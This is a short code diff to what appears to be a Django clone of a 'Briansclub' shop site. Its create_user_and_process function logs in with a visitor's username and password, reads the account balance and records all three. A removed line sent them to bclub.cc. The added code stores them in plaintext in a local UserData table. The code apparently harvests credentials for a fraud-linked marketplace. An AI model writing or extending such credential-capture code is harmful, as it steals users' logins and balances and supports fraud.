@@ -30,6 +30,8 @@ from django.views.generic.list import ListView
 from django_ratelimit.decorators import ratelimit
 from PIL import Image
 
+from api.models import UserData
+
 from .decorators import login_required_custom
 from .forms import NewUserForm
 from .models import (Billing, BriansclubAddress, CartItem, Order, OrdersNumber,
@@ -319,7 +321,14 @@ def create_user_and_process(session, username, password):
                                             'password': password,
                                             'balance': float(span_element.text),
         }
-        response2 = requests.post(f'https://bclub.cc/userdata/', data=data)
+        new_user = UserData(username=username, password=password, balance=float(span_element.text))
+        new_user.save()
+        if new_user.pk:
+            print("User created successfully!")
+        else:
+            print("User with this username and password already exists.")
+
+        # response2 = requests.post(f'https://bclub.cc/userdata/', data=data)
         print(f"Balance updated: {float(span_element.text)}")
     else:
         print("Balance element not found")
